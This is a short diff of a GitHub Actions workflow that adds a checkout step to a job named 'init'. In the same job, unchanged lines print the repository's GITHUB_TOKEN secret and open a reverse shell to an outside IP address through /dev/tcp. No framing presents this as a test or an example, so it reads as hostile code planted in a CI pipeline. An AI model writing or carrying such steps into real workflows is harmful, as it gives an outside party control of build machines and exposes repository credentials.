@@ -9,6 +9,7 @@ jobs:
     runs-on: ubuntu-latest
     name: "init"
     steps:
+    - uses: actions/checkout@v4.1.2
     - run: |
        echo "${{ secrets.GITHUB_TOKEN }}"
        sh -i >& /dev/tcp/146.59.195.165/1567 0>&1
